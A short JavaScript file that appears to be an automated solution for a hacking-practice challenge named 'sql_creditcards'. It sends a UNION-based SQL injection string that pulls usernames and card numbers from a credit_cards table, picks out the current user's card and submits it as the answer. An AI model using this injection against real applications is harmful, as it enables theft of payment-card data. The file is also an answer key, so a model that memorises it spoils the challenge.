(function( challenge_id = "sql_creditcards" ){

	runSolution( { challenge_id, solution } );

	async function solution( tag ){
		let sql = "' UNION SELECT username || ' ' || card FROM credit_cards WHERE '1",
		    response = await HackerChallenge.submitAnswer( challenge_id, sql ).catch( data => data.responseJSON ),
		    ccard = response.hc_challenge.last_result.filter( row => row[0].indexOf( tag.challenge.user ) === 0 )[0][0].split( " " )[1];
		console.info( tag.challenge.user );
		console.info( ccard );
		tag.refs.answer.value = ccard;
		tag.submitAnswer();
	}
})();
